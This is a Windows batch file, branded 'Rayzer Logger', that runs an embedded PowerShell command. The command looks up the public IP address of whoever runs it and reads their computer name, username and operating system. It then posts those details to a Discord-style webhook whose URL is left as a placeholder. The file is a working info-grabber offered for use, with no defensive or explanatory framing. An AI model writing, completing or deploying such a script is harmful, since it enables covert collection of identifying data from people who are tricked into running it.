@echo off

set WEBHOOK_URL=PUT_WEBHOOK_HERE

if "%WEBHOOK_URL%"=="PUT_WEBHOOK_HERE" (
    echo Error: Webhook URL not set!
    pause
    exit
)

powershell -Command ^
"$webhook = '%WEBHOOK_URL%';" ^
"$ip = Invoke-RestMethod -Uri 'https://api.ipify.org';" ^
"$pc = $env:COMPUTERNAME;" ^
"$user = $env:USERNAME;" ^
"$os = (Get-WmiObject -class Win32_OperatingSystem).Caption;" ^
"$payload = @{ ^
    username = 'Rayzer Logger'; ^
    embeds = @(@{ ^
        title = 'New Log'; ^
        color = 16776960; ^
        fields = @( ^
            @{ name = 'IP'; value = '`' + $ip + '`'; inline = $true }; ^
            @{ name = 'Machine'; value = '`' + $pc + '`'; inline = $true }; ^
            @{ name = 'User'; value = '`' + $user + '`'; inline = $true }; ^
            @{ name = 'OS'; value = '`' + $os + '`'; inline = $false } ^
        ); ^
        footer = @{ text = 'Rayzer Logger' }; ^
        timestamp = (Get-Date).ToUniversalTime().ToString('yyyy-MM-ddTHH:mm:ssZ') ^
    }) ^
}; ^
Invoke-RestMethod -Uri $webhook -Method Post -Body ($payload | ConvertTo-Json -Depth 5) -ContentType 'application/json'"

exit
